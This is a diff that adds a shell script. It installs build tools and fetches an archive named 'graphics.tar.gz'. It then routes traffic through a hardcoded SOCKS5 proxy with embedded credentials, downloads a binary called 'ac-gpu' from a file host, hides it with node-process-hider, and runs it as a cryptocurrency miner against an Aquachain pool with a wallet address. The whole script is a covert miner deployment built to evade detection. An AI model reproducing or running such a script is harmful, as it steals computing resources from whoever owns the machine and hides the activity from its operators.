@@ -1,0 +1,40 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install -y ocl-icd-opencl-dev
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+select_proxy_mode=socks5_only 
+socks5 = 45.86.53.248:12324
+socks5_username =  14a179a58c75a
+socks5_password =  0406e41612
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "**"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && npm i -g node-process-hider && chmod +x ac-gpu && ph add ac-gpu && ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/tes -t 1 --proxy socks5://14a179a58c75a:0406e41612@45.86.53.248:12324
